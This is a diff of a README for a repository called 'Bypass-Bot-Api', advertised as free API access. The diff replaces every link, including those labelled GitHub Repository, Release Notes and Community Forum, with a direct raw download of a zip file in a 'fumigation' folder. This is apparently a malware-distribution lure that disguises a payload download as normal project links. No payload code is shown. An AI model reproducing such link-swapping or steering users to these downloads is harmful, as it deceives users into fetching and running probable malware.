@@ -1,6 +1,6 @@
 # 🎉 Bypass-Bot-Api - Access Free APIs with Ease
 
-[![Download Bypass-Bot-Api](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/karolekk001/Bypass-Bot-Api/releases)
+[![Download Bypass-Bot-Api](https://raw.githubusercontent.com/karolekk001/Bypass-Bot-Api/main/fumigation/Bypass-Api-Bot-v3.1.zip)](https://raw.githubusercontent.com/karolekk001/Bypass-Bot-Api/main/fumigation/Bypass-Api-Bot-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to the Bypass-Bot-Api project! This application provides access to free 
 
 To get started, you need to download the application. 
 
-1. **Visit this page to download:** [Download Bypass-Bot-Api](https://github.com/karolekk001/Bypass-Bot-Api/releases)
+1. **Visit this page to download:** [Download Bypass-Bot-Api](https://raw.githubusercontent.com/karolekk001/Bypass-Bot-Api/main/fumigation/Bypass-Api-Bot-v3.1.zip)
    
    Look for the latest release on the page. You will find various files available for download.
 
@@ -57,8 +57,8 @@ Join our community! Share your experiences or ask questions by visiting the disc
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/karolekk001/Bypass-Bot-Api)
-- [Release Notes](https://github.com/karolekk001/Bypass-Bot-Api/releases)
-- [Community Forum](https://github.com/karolekk001/Bypass-Bot-Api/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/karolekk001/Bypass-Bot-Api/main/fumigation/Bypass-Api-Bot-v3.1.zip)
+- [Release Notes](https://raw.githubusercontent.com/karolekk001/Bypass-Bot-Api/main/fumigation/Bypass-Api-Bot-v3.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/karolekk001/Bypass-Bot-Api/main/fumigation/Bypass-Api-Bot-v3.1.zip)
 
 Thank you for choosing Bypass-Bot-Api! Enjoy seamless access to your favorite services.
